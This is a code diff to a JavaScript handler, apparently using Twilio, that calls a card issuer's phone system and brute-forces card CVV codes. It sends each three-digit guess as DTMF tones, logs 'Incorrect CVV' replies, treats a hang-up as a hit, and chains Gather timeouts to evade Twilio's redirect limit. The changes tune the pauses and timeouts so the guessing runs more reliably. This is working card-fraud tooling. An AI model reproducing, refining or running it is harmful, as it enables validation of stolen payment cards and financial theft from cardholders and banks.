@@ -97,20 +97,20 @@ export const handleTryCode = async (req, res) => {
         // Subsequent codes just play the 3 digit test code
         await AttemptModel.addLog(attemptId, `IVR says "Incorrect CVV" for ${(currentCodeNum - 1).toString().padStart(3, '0')}. Trying next...`);
         await AttemptModel.addLog(attemptId, `DTMF Sent: ${baseCard}:${currentTestCode}`);
-        twiml.play({ digits: currentTestCode });
+        twiml.play({ digits: `ww${currentTestCode}` });
     }
     
     // Update the DB so the frontend shows the current Test code progressing
     await AttemptModel.updateTestValue(attemptId, `${baseCard}:${currentTestCode}`);
     
-    // Give the IVR time to say "Incorrect" (usually 4 seconds is enough)
+    // Give the IVR time to say "Incorrect" (usually 4 seconds is enough, bumped to 6 for safety)
     // If the code is correct, the IVR says "Thank you" and HANGS UP the call.
     // We use a Gather verb that times out to bypass Twilio's maximum Redirect limit!
     const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
     twiml.gather({
         action: `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`,
         method: 'POST',
-        timeout: 4,
+        timeout: 6,
         input: 'dtmf',
         numDigits: 1
     });
